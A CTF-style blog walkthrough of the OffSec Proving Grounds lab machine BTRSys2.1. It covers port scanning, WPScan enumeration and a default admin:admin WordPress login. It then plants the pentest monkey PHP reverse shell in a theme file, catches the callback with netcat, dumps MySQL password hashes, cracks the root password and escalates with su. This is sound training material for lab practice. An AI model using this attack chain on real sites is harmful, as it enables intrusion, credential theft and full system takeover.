---
title: "Proving grounds Play: BTRSys2.1"
layout: post
date: 2023-10-02 04:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
- Wordpress
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```sh
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 08eee3ff3120876c12e71caac4e754f2 (RSA)
|   256 ade11c7de78676be9aa8bdb968927787 (ECDSA)
|_  256 0ce1eb060c5cb5cc1bd1fa5606223167 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

## 80/tcp - open  http - Apache httpd 2.4.18 ((Ubuntu))

http://192.168.169.50/ = Just a snake gif.

### Directory Fuzzing

Discovered robots.txt file.

```text
Disallow: Hackers
Allow: /wordpress/


 .o+.                    :o/                                                   -o+`                
  /hh:                    shh`                                                  +hh-                
  /hh:                    shh`                         -/:                      +hh-                
  /hh:                    shh`                         +s+                      +hh-                
  /hh/............   `....shh-....   ...............`  `-`   `..............`   +hh-          ..    
  /hhyyyyyyyyyyyyy/ `syyyyyhhyyyyy. -yyyyyyyyyyyyyyy/  oys   +ssssssssssssss/   +hh-        .+yy-   
  /hh+---------/hh+  .----yhh:----  :hho------------`  yhy`  oyy------------`   +hh-      .+yys:`   
  /hh:         -hh+       shh`      :hh+               yhy`  oyy                +hh-   `.+yys/`     
  /hh:         -hh+       shh`      :hh+               yhy`  oss          `--   +hhsssssyhy/`       
  /hh:         -hh+       shh`      :hh+               yhy`  `-.          +yy.  +hho+++osyy+.       
  /hh:         -hh+       shh`      :hh+               yhy`               +yy.  +hh-    `/syy+.     
  /hho:::::::::+hh+       shh`      :hh+               yhy`  .::::::::::::oyy.  +hh-      `/yyy/`   
  :yyyyyyyyyyyyyyy:       +ys`      .yy:               oys   +sssssssssssssss`  /ys.        `/sy-   
   ```````````````         `         ``                 `     ``````````````     ``                
```

http://192.168.169.50/wordpress/

## WPScan

```sh
wpscan --url http://192.168.169.50/wordpress/ --enumerate u --enumerate p --enumerate t
```

### Usernames

- btrisk
- admin

http://192.168.169.50/wordpress/wp-login.php

Login to the admin account using credentials `admin:admin`.

## Initial Foothold

Download pentest monkey PHP reverse shell and make changes accordingly. 

Navigate to Dashboard ➡️ Appearance ➡️ Editor ➡️ Comments.php. Ensure the changes we are making is to the right theme, and in order to confirm the theme is use to a particular page is by view-source of the page and check the theme.


Replace the contents of the `comments.php` file with the pentest monkey revserse shell and save the file.

Now navigate to the `http://192.168.169.50/wordpress/` page and click the comments button to trigger the reverse shell.

```sh
naveenj@hackerspace:|09:44|~/proving_grounds/BTRSys2.1/files$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.190] from (UNKNOWN) [192.168.169.50] 53568
Linux ubuntu 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 06:45:09 up  1:27,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (855): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/$ 
```

**Initial Foothold Obtained**

## Privilege Escalation

Check the `wp-config.php` for database credentials and then use them to login to the mysql server. If there is any issue with the shell, for example:

```sh
www-data@ubuntu:/home/btrisk$ mysql -uroot -prootpassword!
mysql -uroot -prootpassword!
mysql: [Warning] Using a password on the command line interface can be insecure.
```

If there are no further update in the shell, then do the follwing command.

```sh
/usr/bin/script -qc /bin/bash /dev/null
```

This will resolve the issue and provide the right shell to work with.

### Login to mysql

```sh
www-data@ubuntu:/$ mysql -uroot -prootpassword!
mysql -uroot -prootpassword!
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 132
Server version: 5.7.17-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| deneme             |
| mysql              |
| performance_schema |
| phpmyadmin         |
| sys                |
| wordpress          |
+--------------------+
7 rows in set (0.00 sec)

mysql> use wordpress;
use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+----------------------------+
| Tables_in_wordpress        |
+----------------------------+
| wp_abtest_experiments      |
| wp_abtest_goal_hits        |
| wp_abtest_goals            |
| wp_abtest_ip_filters       |
| wp_abtest_variation_views  |
| wp_abtest_variations       |
| wp_commentmeta             |
| wp_comments                |
| wp_links                   |
| wp_masta_campaign          |
| wp_masta_cronapi           |
| wp_masta_list              |
| wp_masta_reports           |
| wp_masta_responder         |
| wp_masta_responder_reports |
| wp_masta_settings          |
| wp_masta_subscribers       |
| wp_masta_support           |
| wp_options                 |
| wp_postmeta                |
| wp_posts                   |
| wp_term_relationships      |
| wp_term_taxonomy           |
| wp_terms                   |
| wp_usermeta                |
| wp_users                   |
+----------------------------+
26 rows in set (0.00 sec)

mysql> select * from wp_users;
select * from wp_users;
2 rows in set (0.00 sec)

mysql> 
```

```text
root: a318e4507e5a74604aafb45e4741edd3
```

Crack the hash for the above, and use switch user command to login to root user. Cracked password for root `roottoor`.

```sh
www-data@ubuntu:/$ su root
su root
su: must be run from a terminal         #issue with the terminal
www-data@ubuntu:/$ /usr/bin/script -qc /bin/bash /dev/null          #resolution
/usr/bin/script -qc /bin/bash /dev/null
www-data@ubuntu:/$ su root          #switch user to root
su root
Password: roottoor

root@ubuntu:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/# 
```

**Root Obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).